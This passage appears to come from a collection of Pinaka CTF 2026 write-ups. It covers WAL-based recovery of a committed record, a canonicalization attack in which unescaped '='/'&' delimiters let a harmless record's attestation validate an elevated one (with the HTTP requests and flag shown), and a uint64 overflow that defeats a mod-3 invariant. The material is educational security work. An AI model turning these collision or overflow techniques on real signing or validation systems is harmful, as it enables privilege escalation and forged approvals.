For the sealed record the body begins `53 0c 03 00 00 00 a4 8e 00 00`, which is lid `0x0c53 = 3155`, epoch `3`, txn `0x00008ea4 = 36516`, followed by `AHALYA-STONE:3155:v3:scribe36516`.

![hex dump of the sealed frame showing PNKPMEM1 magic, lid, epoch, txn and PNKSEAL1](https://cyberhx.com/writeups/cryptonite/rev/12.webp)

**`l2p.map` and wear leveling.** The map starts with a 34-byte header (`PNKL2PM1`, slot count 47189, record count 5000, sealed lid 3155). Then come 5000 entries of 18 bytes (`lid u16, epoch u32, pba_start u32, pba_end u32, crc32`), then 16 relocation entries of 12 bytes (`slot u32, pba u32, crc32`).

Wear leveling maps a logical pba to a medium slot with:

```python
slot = (18791 * pba + 1112) % 47189
```

The 16 relocation entries override this for specific pbas. For the recovered record, pba 36515 gives `(18791 * 36515 + 1112) % 47189 == 26417`, which matches `physical_slot`.

**WAL in `archive.log`.** The log starts with an 18-byte header (`PNKWALOG`, version, expected record count 53536, CRC32), followed by `LREC` records:

- `0x23`: 45 bytes -> write record
- `0x0d`: 23 bytes -> decision record, where byte 2 is the decision (`2` commit, `3` abort)

![hex view of archive.log header and the first few LREC records](https://cyberhx.com/writeups/cryptonite/rev/13.webp)

## Solution

**Recovery algorithm:**

1. Start from the checkpoint. All 5000 map entries point at logical pba 12,514.
2. Replay the log in order.
3. Drop the 3,501-write batch and the 2,500 abort records. They are losers.
4. For committed transactions, accept only frames whose valid flag is set. 2,001 commit-marked frames in pba 34,515 to 36,514 and pba 38,016 have flag `0`, so they are invalid or torn and get skipped.
5. Reject the 31 frames at pba 41,018 to 41,048. They sit past the last log record and are the torn tail from the power loss.
6. For each live lid, keep the highest epoch that is both committed and valid.

For lid 3155 the versions are:

- epoch 3: pba 36,515 -> committed and valid
- epoch 4: pba 38,016 -> commit-marked but flag 0, invalid
- epoch 5: pba 39,517 -> no matching commit
- epoch 6: pba 41,018 -> torn tail

So the real latest-committed record is epoch 3, even though epochs 4 to 6 look newer.

![recovery script output showing the four versions of lid 3155 and which one is chosen](https://cyberhx.com/writeups/cryptonite/rev/14.webp)

**Digests.** The record digest is SHA-256 over the exact 200-byte body:

```python
body = nvm[26417*235 + 23 : 26417*235 + 223]
record_digest = hashlib.sha256(body).hexdigest()
# b3ef6fd95676c067ef3b46df05a0601d27ee27978ced72842771616ff13e92a8
```

The archive digest is built from every live record (5000 of them):

```python
parts = []
for lid in sorted(live):
    payload_hash = hashlib.sha256(live[lid].payload).hexdigest()
    parts.append(f"{lid}:{live[lid].epoch}:{payload_hash}")
archive_digest = hashlib.sha256(";".join(parts).encode()).hexdigest()
# ea05aa9e0f487c43f680e51f4f06758149b345f3822dbed55ec080b1c37cc6bc
```

## Submission

```json
{
  "target_lid": 3155,
  "committed_epoch": 3,
  "committed_txn": 36516,
  "physical_slot": 26417,
  "record_digest": "b3ef6fd95676c067ef3b46df05a0601d27ee27978ced72842771616ff13e92a8",
  "committed_record_count": 5000,
  "archive_digest": "ea05aa9e0f487c43f680e51f4f06758149b345f3822dbed55ec080b1c37cc6bc"
}
```

The validator returned `{"status":"memory-restored"}`. The recovered record's 200-byte payload starts with `AHALYA-STONE:3155:v3:scribe36516` and is padded with dots.

## Notes

- The visible ASCII prefix isn't the whole payload. The digest is over the full 200-byte body, including the 9-byte record prefix and the dot padding.
- The duplicate lid/epoch/txn block at offset 23 starts the body, so don't treat it as a separate header when hashing.
- The wear-leveling indirection must be inverted. A frame whose lid and epoch look right can still be in the wrong physical place.
- Commit-marked does not mean valid. The flag byte decides whether the write survived.
- Frames after the last log record are the torn write. They aren't committed even if their headers look newer.
- A higher epoch can be a loser. Epoch 6 is newer than epoch 3 but is torn.

title: Bala & Atibala: The Forgotten State
excerpt: The warden attests one record and then honours a different record that flattens to the same bytes. The goal is to get an "elevated" record (mantra=atibala, tier>=7) accepted using the attestation of a harmless one.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Reverse engineering · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

**Category:** misc / canonicalization
**Flag:** `PINAKA{bala_atibala_the_flattened_record_forgets}`

## Overview

The warden attests one record and then honours a different record that flattens to the same bytes. The goal is to get an "elevated" record (`mantra=atibala`, `tier>=7`) accepted using the attestation of a harmless one.

Files and components:

- Kotlin boundary: `serialize` and `checkElevated`
- JNI glue into `fsvm_attest`, which runs `attest.vmb` with a 16-byte warden key
- `sample_petition.json`: sample pairs with a sample attested state

## Analysis

A boon record is an ordered list of `[key, value]` string pairs, and duplicates are allowed. The Kotlin boundary serializes it with no escaping, so `=` and `&` inside a key or value are written as-is:

```kotlin
fun serialize(rec: Record): ByteArray {
    val sb = StringBuilder()
    for ((k, v) in rec.pairs) { sb.append(k); sb.append('='); sb.append(v); sb.append('&') }
    return sb.toString().toByteArray(Charsets.UTF_8)
}
```

The check for "is this record supreme?" looks at the pairs list, not the bytes:

```kotlin
fun checkElevated(rec: Record): Boolean {
    val m = rec.pairs.any { it.first == "mantra" && it.second == "atibala" }
    val t = rec.pairs.any { it.first == "tier" && (it.second.toIntOrNull() ?: 0) >= 7 }
    return m && t
}
```

`nativeAttest(serialize(rec))` runs the bytecode with the warden key, which isn't in any player file, so the state can't be computed locally. That doesn't matter: the warden computes it for a non-elevated record, and a collision makes that state valid for an elevated one.

![the Kotlin serialize() and checkElevated() source side by side](https://cyberhx.com/writeups/cryptonite/rev/4.webp)

## Solution

Two records with different pair structures serialize to identical bytes:

- Record A (attestable): `[["mantra=atibala&tier","7"]]` -> `mantra=atibala&tier=7&`
- Record B (supreme): `[["mantra","atibala"],["tier","7"]]` -> `mantra=atibala&tier=7&`

`checkElevated(A)` is false: A has one pair whose key is the literal string `mantra=atibala&tier`, so there is no `mantra` key and no `tier` key, and the warden attests it. `checkElevated(B)` is true. Since `serialize(A) == serialize(B)`, the attestation output is identical, so A's attested state can be presented with B.

## Submission

Petition with record A:

```http
POST /ashram/petition
{"pairs":[["mantra=atibala&tier","7"]]}
```

```json
{"attested_state":"4ce21f87d685eba923a22160f8e17f70","status":"attested"}
```

Claim with record B, reusing that state:

```http
POST /ashram/claim
{"pairs":[["mantra","atibala"],["tier","7"]],"attested_state":"4ce21f87d685eba923a22160f8e17f70"}
```

```json
{"flag":"PINAKA{bala_atibala_the_flattened_record_forgets}","proclamation":"Vishwamitra honours the forgotten boon of Atibala","status":"granted"}
```

## Notes

- The sample `attested_state` is `f5ee9d3c3316c3890e9efef1705e95e4`, but the live server returns `644d61bc...` for the same pairs. The sample was made with a different key or build and wasn't needed.
- The claim endpoint re-attests whatever record you present and only compares the flattened state, never the pair list from the petition. That is why this works.
- Any equivalent collision works, for example hiding `&tier=7` inside a value or splitting the key differently, as long as `serialize` produces the same bytes.

title: Dhanurbhanga: The Fractured Invariant
excerpt: Produce a well-formed Pinaka Tension Machine (PTM) program whose final register equals TARGET = 3205865151537252764. A formal proof says that's impossible over unbounded integers, but the real checker does its…
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Reverse engineering · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

**Category:** reverse engineering / logic
**Flag:** `PINAKA{dhanurbhanga_a_single_uint64_wrap_shatters_shivas_unbreakable_bow}`

## Overview

Produce a well-formed Pinaka Tension Machine (PTM) program whose final register equals `TARGET = 3205865151537252764`. A formal proof says that's impossible over unbounded integers, but the real checker does its arithmetic in `uint64`.

Files:

- `pinaka_check.c`: the real checker
- `formal_model.py`: Python-bignum model that implements the proof

## Analysis

The machine:

- State: one non-negative integer register `x`, starting at `X0 = 0`.
- Opcodes: `HALT`, `TRPL (x*3)`, `SQ (x*x)`, `ADDK imm (x+imm)`, `MULK imm (x*imm)`. Immediates are little-endian unsigned 64-bit.
- Well-formed means: valid opcodes, complete 8-byte immediates, every `imm % 3 == 0`, at most 4096 bytes, at most 1024 steps.
- Accept if and only if the program is well-formed and the halting register equals `TARGET`.

![pinaka_check.c](https://cyberhx.com/writeups/cryptonite/rev/15.webp)

**Why the proof says no.** With `X0 = 0` and every immediate divisible by 3, "`x  ==  0 (mod 3)`" survives every opcode:

- `TRPL`: `3x` -> preserves it (x3)
- `SQ`: `x*x` -> preserves it
- `ADDK`: `x+imm` with `imm  ==  0` -> preserves it
- `MULK`: `x*imm` -> preserves it

Every reachable `x` is divisible by 3, but `TARGET  ==  2 (mod 3)`, so it's unreachable over Z. `formal_model.py` implements exactly this and rejects every attempt.

**The crack.** The proof assumed exact integers, but the checker works mod 2^64, and:

```
2^64  ==  1 (mod 3)     (not 0)
```

Every wraparound subtracts a multiple of 2^64, and because that isn't divisible by 3, it shifts the residue of `x` mod 3. One overflow is enough to escape the invariant.

## Solution

We need a true-integer sum `S` divisible by 3 (so every immediate is legal) and congruent to `TARGET` mod 2^64:

```
S = TARGET + k*2^64 ,   need S  ==  0 (mod 3)
   =>  (TARGET + k)  ==  0 (mod 3)   =>   k  ==  -TARGET  ==  1 (mod 3)
```

With `k = 1`:

```
S = TARGET + 2^64 = 21652609225246804380      (S % 3 == 0, S mod 2^64 == TARGET)
```

Split `S` into two `ADDK` immediates, each below 2^64 and divisible by 3 (`2^64 - 1  ==  0 mod 3`):

```
10 ffffffffffffffff   ADDK 18446744073709551615   (= 2^64-1,  ==  0 mod 3)
10 9d892eb35e857d2c   ADDK  3205865151537252765    ( ==  0 mod 3)
00                    HALT
```

Program hex (19 bytes): `10ffffffffffffffff109d892eb35e857d2c00`

Under `uint64`: `0 + (2^64-1) = 2^64-1`, then adding `3205865151537252765` overflows once and wraps to exactly `TARGET`.

Local verification:

- `formal_model.py`: `final = 21652609225246804380`, REJECT (well-formed but unreachable over Z, as proven)
